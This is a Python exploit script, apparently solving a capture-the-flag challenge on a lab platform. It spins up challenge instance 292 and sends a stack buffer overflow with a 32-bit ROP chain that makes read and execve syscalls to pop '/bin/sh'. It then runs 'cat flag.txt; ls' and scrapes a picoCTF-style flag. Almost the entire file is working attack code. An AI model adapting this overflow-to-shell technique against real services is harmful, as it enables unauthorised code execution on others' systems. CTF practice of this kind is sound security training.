import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/292/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/292/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
EAX3, ADD2, ADD3 = 0x0809dae0, 0x0809da87, 0x0809daa0
POP_EBX, POP_ECX, POP_EDX = 0x0804901e, 0x08049a31, 0x0805848e
INT80, XOREDX, BSS = 0x0805e4b0, 0x0804c325, 0x080e5000


def p32(x):
    return struct.pack("<I", x)


c = b""
c += p32(EAX3) + p32(POP_EBX) + p32(0) + p32(POP_ECX) + p32(BSS)
c += p32(POP_EDX) + p32(8) + p32(0) + p32(0) + p32(INT80)
c += p32(XOREDX) + p32(BSS) + p32(0) + p32(0) + p32(0)
c += p32(EAX3) + p32(ADD2) + p32(ADD3) + p32(ADD3)
c += p32(POP_ECX) + p32(0) + p32(INT80)
payload = b"A" * 28 + c
print("payload:", len(payload), "0x0a:", b"\n" in payload)
s = socket.create_connection((host, port), timeout=15)
s.settimeout(6)
time.sleep(0.4)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(payload + b"\n")
time.sleep(0.8)
s.sendall(b"/bin/sh\x00")
time.sleep(0.8)
s.sendall(b"cat flag.txt; ls\n")
time.sleep(1.0)
out = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        ch = s.recv(8192)
        if not ch:
            break
        out += ch
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== reponse ===")
print(txt[:900])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", f.group(0) if f else None)
